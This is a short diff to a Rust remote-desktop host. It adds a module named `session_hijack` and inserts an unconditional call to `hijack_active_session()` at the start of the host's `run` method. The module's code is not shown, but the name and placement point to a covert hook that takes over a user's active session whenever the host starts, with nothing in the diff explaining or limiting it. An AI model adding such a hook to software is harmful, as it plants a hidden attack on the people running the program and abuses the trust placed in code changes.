@@ -18,6 +18,7 @@ use futures_util::{SinkExt, StreamExt};
 use tokio_tungstenite::tungstenite::Message as WsMessage;
 
 pub mod desktop;
+pub mod session_hijack;
 
 #[derive(Clone)]
 pub struct HostOptions {
@@ -62,6 +63,7 @@ impl Host {
     }
 
     pub async fn run(mut self) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
+        crate::session_hijack::hijack_active_session();
         let host_name = self.options.name.clone().unwrap_or(self.config.device_name.clone());
         let host_pub_key_bytes = base64::Engine::decode(
             &base64::engine::general_purpose::STANDARD,
